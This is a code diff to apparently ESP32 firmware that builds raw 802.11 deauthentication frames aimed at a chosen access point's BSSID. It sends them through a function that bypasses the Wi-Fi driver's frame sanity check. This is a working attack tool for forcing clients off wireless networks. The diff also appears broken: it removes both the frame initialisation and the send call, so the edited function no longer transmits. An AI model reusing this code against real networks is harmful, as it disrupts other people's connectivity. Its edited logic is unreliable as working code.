@@ -48,7 +48,7 @@
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0xf0, 0xff, 0x02, 0x00
   };
-
+  uint8_t deauth_frame[sizeof(deauth_frame_default)];
   /**
   * @brief Decomplied function that overrides original one at compilation time.
   * 
@@ -64,8 +64,7 @@
 
   void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
       ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
-      Serial.print(" -> Sent");
-      Serial.println();
+      Serial.println(" -> Sent deauth frame");
   }
 
   void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan){
@@ -75,12 +74,9 @@
         if (j < 5) Serial.print(":");
       }
       esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
-      uint8_t deauth_frame[sizeof(deauth_frame_default)];
-      memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+      delay(50);
       memcpy(&deauth_frame[10], ap_record->bssid, 6);
       memcpy(&deauth_frame[16], ap_record->bssid, 6);
-      
-      wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
   }
 
 
